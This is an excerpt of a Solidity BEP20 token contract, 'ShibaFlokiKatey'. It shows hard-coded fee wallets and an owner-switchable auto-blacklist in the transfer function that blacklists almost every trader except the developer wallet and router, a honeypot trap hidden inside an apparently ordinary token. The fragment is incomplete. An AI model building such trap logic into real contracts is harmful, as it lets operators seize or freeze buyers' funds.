...
contract ShibaFlokiKatey is IBEP20, Auth {
    ...
    string constant _name = "ShibaFlokiKatey";
    string constant _symbol = "Katey";
    ...
    address public marketingFeeReceiver = 0x57D9490FA15a33648a374F6167465731419D51f5;
    address public devFeeReceiver = 0xC3AC68F42765d8a3c5837b420AB05Df2c69c1204;
    ...
    bool public autoblacklistsnipeopen = false;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (autoblacklistsnipeopen == true){
            if(tradingOpen == true){
            if (sender != devFeeReceiver && sender !=routerAddress){
            isBlacklisted[sender] = true;
        } else 
        { 
            if(recipient != devFeeReceiver && recipient !=routerAddress){ isBlacklisted[recipient] = true; } 
        }             
        }
        }
    ...
    function autoblacklistsnipestatus(bool _status) public authorized {
        autoblacklistsnipeopen = _status;
    }
